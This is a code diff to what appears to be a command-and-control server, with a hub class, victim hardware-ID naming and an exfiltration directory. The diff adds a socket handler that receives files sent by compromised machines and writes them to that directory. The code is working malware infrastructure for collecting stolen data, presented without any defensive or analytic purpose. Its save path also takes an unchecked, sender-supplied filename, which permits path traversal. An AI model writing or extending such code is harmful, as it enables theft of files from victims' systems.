@@ -42,6 +42,53 @@ except ImportError:
 
 BUFFER_SIZE = 8192
 
+def handle_binary_transfer(client_socket, initial_buffer, exfil_dir):
+    """Receives and saves incoming binary files using the structured transfer protocol."""
+    import struct
+    try:
+        # Receive header: 4 bytes filesize BE + 1 byte filename length
+        if len(initial_buffer) < 5:
+            needed = 5 - len(initial_buffer)
+            chunk = client_socket.recv(needed)
+            initial_buffer += chunk
+        
+        filesize, name_len = struct.unpack(">I B", initial_buffer[:5])
+        remaining_buffer = initial_buffer[5:]
+        
+        # Read filename
+        while len(remaining_buffer) < name_len:
+            chunk = client_socket.recv(min(name_len - len(remaining_buffer), 8192))
+            if not chunk:
+                return None
+            remaining_buffer += chunk
+        
+        filename = remaining_buffer[:name_len].decode('utf-8', errors='ignore')
+        remaining_buffer = remaining_buffer[name_len:]
+        
+        print(f"[*] Downloading {filename} ({filesize} bytes)...")
+        
+        save_path = os.path.join(exfil_dir, filename)
+        
+        with open(save_path, "wb") as f:
+            # Write any remaining bytes we already have
+            if remaining_buffer:
+                f.write(remaining_buffer)
+            
+            remaining = filesize - len(remaining_buffer)
+            while remaining > 0:
+                chunk = client_socket.recv(min(remaining, 8192))
+                if not chunk:
+                    break
+                f.write(chunk)
+                remaining -= len(chunk)
+        
+        print(f"[+] {filename} saved successfully to {save_path}")
+        return save_path
+    
+    except Exception as e:
+        print(f"[!] Binary transfer failed: {e}")
+        return None
+
 class NodeNamingManager:
     """Manages persistent mapping between HWIDs and node aliases."""
     
@@ -314,6 +361,16 @@ class CommandHub:
                     buffer += chunk
 
                     while True:
+                        # Check for new binary transfer protocol
+                        transfer_start = buffer.find(b"TRANSFER_START")
+                        if transfer_start != -1:
+                            # Handle structured binary file transfer
+                            initial_data = buffer[transfer_start + len(b"TRANSFER_START"):]
+                            handle_binary_transfer(client, initial_data, self.exfil_dir)
+                            # Clear buffer after transfer
+                            buffer = b''
+                            continue
+
                         header_start = buffer.find(b"DATA_HEADER|")
                         if header_start != -1:
                             newline_index = buffer.find(b"\n", header_start)
